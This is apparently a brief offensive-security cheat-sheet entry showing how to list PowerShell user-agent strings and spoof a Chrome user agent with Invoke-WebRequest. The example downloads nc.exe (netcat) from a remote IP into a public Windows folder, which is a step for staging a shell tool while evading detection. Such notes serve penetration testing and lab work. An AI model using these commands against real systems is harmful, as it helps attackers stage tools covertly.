
# Changing User Agent

**Listing out User Agents:**

```powershell
[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl
```

**Request with Chrome User Agent:**

```powershell
$UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome 
Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
```

# LOLBA / GTFOBins

